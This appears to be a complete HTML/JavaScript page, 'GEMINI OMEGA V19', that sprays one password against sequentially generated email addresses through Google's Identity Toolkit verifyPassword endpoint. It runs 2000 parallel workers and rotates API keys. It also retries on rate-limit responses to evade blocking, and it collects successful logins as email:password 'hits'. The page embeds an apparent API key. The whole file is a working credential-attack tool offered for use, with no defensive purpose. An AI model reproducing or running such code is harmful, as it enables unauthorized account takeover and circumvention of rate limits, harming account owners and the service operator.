<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GEMINI OMEGA V19</title>
    <style>
        :root { --neon: #00ffcc; --bg: #050505; }
        body { background: #000; color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 10px; display: flex; justify-content: center; }
        .panel { width: 100%; max-width: 600px; border: 2px solid var(--neon); background: var(--bg); padding: 20px; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 255, 204, 0.2); }
        h1 { font-size: 22px; text-align: center; color: var(--neon); text-shadow: 0 0 10px var(--neon); margin: 0 0 15px 0; }
        
        .row { display: flex; gap: 8px; margin-bottom: 10px; }
        input { flex: 1; padding: 12px; background: #111; border: 1px solid #333; color: #fff; border-radius: 8px; outline: none; text-align: center; font-size: 14px; }
        input:focus { border-color: var(--neon); }

        .btn-launch { width: 100%; padding: 18px; background: var(--neon); color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 8px; transition: 0.3s; text-transform: uppercase; }
        .btn-launch:active { transform: scale(0.98); }
        .btn-copy { width: 100%; padding: 12px; background: #222; color: var(--neon); border: 1px solid var(--neon); margin-top: 10px; cursor: pointer; border-radius: 8px; font-weight: bold; }

        .monitor { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 15px 0; }
        .m-card { background: #000; border: 1px solid #222; padding: 10px; border-radius: 8px; text-align: center; }
        .m-card span { font-size: 10px; color: #777; display: block; }
        .m-card b { font-size: 20px; color: var(--neon); }

        #status { font-size: 12px; color: #ffeb3b; background: #1a1a00; padding: 8px; border-radius: 5px; margin-bottom: 10px; border-left: 4px solid #ffeb3b; text-align: left; }
        #results { width: 100%; height: 300px; background: #000; color: #0f0; border: 1px solid #111; padding: 10px; font-size: 13px; border-radius: 8px; resize: none; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="panel">
    <h1>GEMINI OMEGA V19</h1>
    
    <div id="status">⚡ SYSTEM READY: Awaiting ignition...</div>

    <div class="row">
        <input type="number" id="start" placeholder="START NUM">
        <input type="number" id="end" placeholder="END NUM">
    </div>
    <input type="text" id="keys" style="width:100%; margin-bottom:10px; box-sizing:border-box;" placeholder="API KEYS (Comma separated for 10x Speed)" value="AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ">
    <input type="text" id="fmt" style="width:100%; margin-bottom:10px; box-sizing:border-box;" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
    <input type="text" id="pwd" style="width:100%; margin-bottom:10px; box-sizing:border-box;" placeholder="PASSWORD">
    
    <button class="btn-launch" id="actionBtn" onclick="ignite()">⚡ START SEQUENTIAL ATTACK</button>

    <div class="monitor">
        <div class="m-card"><span>CHECKED</span><b id="c">0</b></div>
        <div class="m-card"><span>FOUND</span><b id="f">0</b></div>
        <div class="m-card"><span>SPEED/S</span><b id="s">0</b></div>
    </div>

    <textarea id="results" readonly placeholder="Hits will appear here in 1,2,3 order..."></textarea>
    <button class="btn-copy" onclick="copyHits()">📋 COPY ALL HITS</button>
</div>

<script>
    let active = false, checked = 0, found = 0, head, index, limit, startTime;
    let storage = new Map();
    let uiBuffer = "";
    
    async function ignite() {
        if (active) { location.reload(); return; }

        let s = parseInt(document.getElementById('start').value);
        let e = parseInt(document.getElementById('end').value);
        let k = document.getElementById('keys').value.split(',').map(x => x.trim());
        let f = document.getElementById('fmt').value.toUpperCase().trim();
        let p = document.getElementById('pwd').value.trim();

        if (isNaN(s) || isNaN(e) || !f.includes('{')) return alert("Input errors!");

        active = true; head = s; index = s; limit = e; startTime = Date.now();
        document.getElementById('actionBtn').innerText = "🛑 STOP ENGINE";
        document.getElementById('actionBtn').style.background = "#ff0055";

        // --- MASSIVE PARALLEL WORKERS (2000 THREADS) ---
        for (let i = 0; i < 2000; i++) {
            (async function worker() {
                while (active && index <= limit) {
                    let curIdx = index++;
                    let currentKey = k[curIdx % k.length];
                    await check(f, p, currentKey, curIdx);
                }
            })();
        }

        // --- HIGH-SPEED SYNC LOOP ---
        setInterval(() => {
            if (!active) return;
            document.getElementById('c').innerText = checked;
            document.getElementById('f').innerText = found;
            let elapsed = (Date.now() - startTime) / 1000;
            let speed = Math.round(checked / elapsed);
            document.getElementById('s').innerText = speed;
            document.getElementById('status').innerText = `📡 SYNCING AT: ${head} | REQ/SEC: ${speed}`;

            if (uiBuffer !== "") {
                let box = document.getElementById('results');
                box.value += uiBuffer;
                box.scrollTop = box.scrollHeight;
                uiBuffer = "";
            }
        }, 400);
    }

    async function check(fmt, pwd, key, idx) {
        let email = fmt.replace(/\{(\d+)\}/, idx.toString().padStart(fmt.match(/\{(\d+)\}/)[1], '0'));
        
        try {
            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
                method: 'POST',
                body: JSON.stringify({ email, password: pwd, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });

            if (res.status === 429) {
                // IP BLOCK PROTECTION: Cooldown and Auto-Retry
                await new Promise(r => setTimeout(r, 1500));
                return check(fmt, pwd, key, idx);
            }

            let data = await res.json();
            storage.set(idx, { ok: (data && data.idToken), mail: email });

            // --- THE OMEGA SEQUENTIAL LOCK ---
            // This ensures 1,2,3,4... order even at 2000 req/sec
            while (storage.has(head)) {
                let item = storage.get(head);
                if (item.ok) {
                    found++;
                    uiBuffer += item.mail + ":" + pwd + "\n";
                }
                checked++;
                storage.delete(head);
                head++;
            }
        } catch (e) {
            // Network failure retry
            return check(fmt, pwd, key, idx);
        }
    }

    function copyHits() {
        let box = document.getElementById('results');
        box.select();
        document.execCommand('copy');
        alert("Hits Copied to Clipboard!");
    }
</script>
</body>
</html>
